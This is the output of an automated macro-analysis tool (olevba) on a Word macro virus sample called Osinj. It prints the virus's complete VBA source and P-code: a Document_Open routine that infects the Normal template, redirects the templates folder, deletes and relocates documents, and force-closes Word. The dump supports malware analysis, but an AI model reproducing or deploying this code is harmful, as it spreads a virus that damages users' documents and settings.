olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Osinj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Osinj.cls 
in file: Virus.MSWord.Osinj - OLE stream: 'Macros/VBA/Osinj'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'
' Fuck you!
'
    If ActiveDocument.Path <> "" _
        And ActiveDocument.Name <> "Normal.doc" And ActiveDocument.Name _
        <> "Normal.dot" And InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), _
        "\normal", 1) <> 0 And Osinj = "Normal.dot" Then
    SName$ = ActiveDocument.Name
    SPath$ = ActiveDocument.Path
    Selection.WholeStory
    Selection.Copy
    Vesna.Two
    ChangeFileOpenDirectory Path:=ActiveDocument.Path
    Vesna.Three
    ChangeFileOpenDirectory _
        Options.DefaultFilePath(wdUserTemplatesPath)
    Documents.Open FileName:="Normal.doc", ConfirmConversions:=False, ReadOnly _
        :=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate _
        :="mark", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="" _
        , Format:=wdOpenFormatAuto
    Selection.Paste
    aa% = 1
    bb% = 1
    cc% = 1
    dd% = 1
    If Date > _
    FileDateTime(Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal2.doc") + 10 Then
    Do
      aa = MsgBox("Are you down?", vbYesNo, "Osinj")
      If aa = 7 Then
        bb = MsgBox("Are you sure?", vbYesNo, "Osinj")
        If bb = 6 Then
          MsgBox "Ms Word works for downs only."
          Selection.TypeText Text:="d"
          Selection.MoveLeft Unit:=wdCharacter, Count:=1
          Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
          Selection.Cut
          For cc = 1 To Documents.Count
            Vesna.Four (cc)
            aa = 6
          Next
          Interaction.SendKeys "%{F4}"
        End If
      End If
    Loop While aa = 7
    End If
    ChangeFileOpenDirectory Path:=SPath
    If Documents.Count > 0 Then
      ActiveDocument.SaveAs FileName:=SName, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    End If
    ElseIf Osinj <> "Normal.dot" And Osinj <> "" Then
''---------------------------------------''
    b$ = "False"
    On Error GoTo ErrLabel
    SourceName$ = ActiveDocument.Name
    c$ = "Normal.doc"
    Windows(c).Activate
    If b = "True" Or ActiveDocument.Name = c Then
        Varriable = Options.DefaultFilePath(wdUserTemplatesPath)
        If InStr(2, Options.DefaultFilePath(wdUserTemplatesPath), "\normal", 1) = 0 Then
            werh = True
            Selection.WholeStory
            Selection.Delete
            SourcePath$ = ActiveDocument.Path
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
            If Dir("Normal", vbDirectory) = "" Then
                MkDir Path:="Normal"
            End If
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal2.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ActiveDocument.SaveAs FileName:="Normal.doc", FileFormat:= _
                wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
            SaveAsAOCELetter:=False
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath) + "\Normal"
            ActiveDocument.SaveAs FileName:="Normal.dot", FileFormat:= _
                wdFormatTemplate, LockComments:=False, Password:="", AddToRecentFiles:= _
                True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
                False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
                SaveAsAOCELetter:=False
            Options.DefaultFilePath(wdUserTemplatesPath) = Options.DefaultFilePath(wdUserTemplatesPath) + "\Normal"
            ActiveDocument.Save
            ActiveDocument.Close
            ActiveDocument.Save
            ChangeFileOpenDirectory Path:=SourcePath
            Documents.Open FileName:=SourceName, ConfirmConversions:=False, ReadOnly:= _
                False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:= _
                "", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", _
                Format:=wdOpenFormatAuto
            Windows("Normal.doc").Activate
            ActiveWindow.Close
        End If
    End If
''---------------------------------------''
    End If
ErrLabel:
    Select Case Err.Number
        Case Is = 5941
        b = "True"
        If c = "Normal.doc" Then
        c = "Normal.dot"
        Else
        c = SourceName
        End If
        Err.Clear
        Resume
    End Select
End Sub

-------------------------------------------------------------------------------
VBA MACRO Vesna.bas 
in file: Virus.MSWord.Osinj - OLE stream: 'Macros/VBA/Vesna'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub One()
    ActiveWindow.Close True
End Sub
Sub Two()
    Selection.Cut
End Sub
Sub Three()
    ActiveWindow.Close False
End Sub
Sub Four(f)
    If f = 1 Then
      MsgBox "You can find your documents which are new in folder " _
        + Options.DefaultFilePath(wdUserTemplatesPath)
    End If
    If ActiveDocument.Path = "" Then
      ChangeFileOpenDirectory Path:=Options.DefaultFilePath(Path:=wdUserTemplatesPath)
      ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Else
      ActiveDocument.Save
    End If
    ActiveDocument.Close
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Osinj
' ===============================================================================
' Module streams:
' Macros/VBA/Osinj - 12223 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x000A " Fuck you!"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	LineCont 0x000C 06 00 08 00 10 00 08 00 1E 00 08 00
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.doc"
' 	Ne 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x000A "Normal.dot"
' 	Ne 
' 	And 
' 	LitDI2 0x0002 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\normal"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Ld Osinj 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St SName$ 
' Line #6:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St SPath$ 
' Line #7:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #8:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #9:
' 	Ld Vesna 
' 	ArgsMemCall Two 0x0000 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #11:
' 	Ld Vesna 
' 	ArgsMemCall Three 0x0000 
' Line #12:
' 	LineCont 0x0004 01 00 08 00
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #13:
' 	LineCont 0x000C 0C 00 08 00 18 00 08 00 26 00 08 00
' 	LitStr 0x000A "Normal.doc"
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0004 "mark"
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #14:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #15:
' 	LitDI2 0x0001 
' 	St aa% 
' Line #16:
' 	LitDI2 0x0001 
' 	St bb% 
' Line #17:
' 	LitDI2 0x0001 
' 	St cc% 
' Line #18:
' 	LitDI2 0x0001 
' 	St dd% 
' Line #19:
' 	LineCont 0x0004 03 00 04 00
' 	Ld Date 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000C "\Normal2.doc"
' 	Add 
' 	ArgsLd FileDateTime 0x0001 
' 	LitDI2 0x000A 
' 	Add 
' 	Gt 
' 	IfBlock 
' Line #20:
' 	Do 
' Line #21:
' 	LitStr 0x000D "Are you down?"
' 	Ld vbYesNo 
' 	LitStr 0x0005 "Osinj"
' 	ArgsLd MsgBox 0x0003 
' 	St aa 
' Line #22:
' 	Ld aa 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitStr 0x000D "Are you sure?"
' 	Ld vbYesNo 
' 	LitStr 0x0005 "Osinj"
' 	ArgsLd MsgBox 0x0003 
' 	St bb 
' Line #24:
' 	Ld bb 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitStr 0x001D "Ms Word works for downs only."
' 	ArgsCall MsgBox 0x0001 
' Line #26:
' 	LitStr 0x0001 "d"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #27:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #28:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0003 
' Line #29:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #30:
' 	StartForVariable 
' 	Ld cc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #31:
' 	Ld cc 
' 	Paren 
' 	Ld Vesna 
' 	ArgsMemCall Four 0x0001 
' Line #32:
' 	LitDI2 0x0006 
' 	St aa 
' Line #33:
' 	StartForVariable 
' 	Next 
' Line #34:
' 	LitStr 0x0005 "%{F4}"
' 	Ld Interaction 
' 	ArgsMemCall SendKeys 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld aa 
' 	LitDI2 0x0007 
' 	Eq 
' 	LoopWhile 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld SPath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #40:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #41:
' 	LineCont 0x0010 09 00 08 00 15 00 08 00 21 00 08 00 2B 00 08 00
' 	Ld SName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld Osinj 
' 	LitStr 0x000A "Normal.dot"
' 	Ne 
' 	Ld Osinj 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #44:
' 	QuoteRem 0x0000 0x002A "'---------------------------------------''"
' Line #45:
' 	LitStr 0x0005 "False"
' 	St B$ 
' Line #46:
' 	OnError ErrLabel 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St SourceName$ 
' Line #48:
' 	LitStr 0x000A "Normal.doc"
' 	St c$ 
' Line #49:
' 	Ld c 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #50:
' 	Ld B 
' 	LitStr 0x0004 "True"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld c 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #51:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Varriable 
' Line #52:
' 	LitDI2 0x0002 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\normal"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (True)
' 	St werh 
' Line #54:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #55:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St SourcePath$ 
' Line #57:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #58:
' 	LitStr 0x0006 "Normal"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #59:
' 	LitStr 0x0006 "Normal"
' 	ParamNamed Path 
' 	ArgsCall MkDir 0x0001 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #62:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 0C 00
' 	LitStr 0x000B "Normal2.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #63:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 0C 00
' 	LitStr 0x000A "Normal.doc"
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #64:
' 	Ld SourcePath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #65:
' 	LineCont 0x000C 0D 00 10 00 19 00 10 00 27 00 10 00
' 	Ld SourceName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #66:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #67:
' 	LineCont 0x0010 09 00 10 00 15 00 10 00 21 00 10 00 2B 00 10 00
' 	LitStr 0x000A "Normal.dot"
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #68:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0007 "\Normal"
' 	Add 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #69:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #70:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	Ld SourcePath 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #73:
' 	LineCont 0x000C 0D 00 10 00 19 00 10 00 27 00 10 00
' 	Ld SourceName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' Line #74:
' 	LitStr 0x000A "Normal.doc"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #75:
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0000 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	QuoteRem 0x0000 0x002A "'---------------------------------------''"
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Label ErrLabel 
' Line #81:
' 	Ld Err 
' 	MemLd Number 
' 	SelectCase 
' Line #82:
' 	LitDI2 0x1735 
' 	CaseEq 
' 	CaseDone 
' Line #83:
' 	LitStr 0x0004 "True"
' 	St B 
' Line #84:
' 	Ld c 
' 	LitStr 0x000A "Normal.doc"
' 	Eq 
' 	IfBlock 
' Line #85:
' 	LitStr 0x000A "Normal.dot"
' 	St c 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	Ld SourceName 
' 	St c 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' Line #90:
' 	Resume  
' Line #91:
' 	EndSelect 
' Line #92:
' 	EndSub 
' Line #93:
' Macros/VBA/Vesna - 4158 bytes
' Line #0:
' 	FuncDefn (Sub One())
' Line #1:
' 	LitVarSpecial (True)
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub Two())
' Line #4:
' 	Ld Selection 
' 	ArgsMemCall Cut 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub Three())
' Line #7:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	ArgsMemCall Close 0x0001 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub Four(False))
' Line #10:
' 	Ld False 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LineCont 0x0004 02 00 08 00
' 	LitStr 0x0034 "You can find your documents which are new in folder "
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	ParamNamed Path 
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #15:
' 	LineCont 0x0010 0B 00 08 00 17 00 08 00 23 00 08 00 2D 00 08 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	LitVarSpecial (False)
' 	ParamNamed EmbedTrueTypeFonts 
' 	LitVarSpecial (False)
' 	ParamNamed SaveNativePictureFormat 
' 	LitVarSpecial (False)
' 	ParamNamed SaveFormsData 
' 	LitVarSpecial (False)
' 	ParamNamed SaveAsAOCELetter 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x000B 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

